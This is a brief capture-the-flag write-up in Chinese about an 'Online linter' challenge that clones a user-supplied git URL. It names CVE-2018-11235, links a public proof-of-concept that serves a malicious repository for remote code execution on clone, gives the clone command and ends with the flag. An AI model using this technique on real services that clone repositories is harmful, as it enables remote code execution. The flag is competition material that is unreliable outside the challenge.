# Online linter

- 這題功能是給你輸入一個網址，然後會Clone下來幫你檢查php code

- 找了一下覺得是`CVE-2018-11235`

- POC: https://github.com/HyperionGray/clone_and_pwn
    - 他會在本地跑一個git server
    - 直接clone就會RCE
    - `git clone git://kaibro.tw/repo`

- `DCTF{4a49b863ba931ac65b077a504b973d9ddab4f343b00651a0b4ff9b8d7575f41f}`
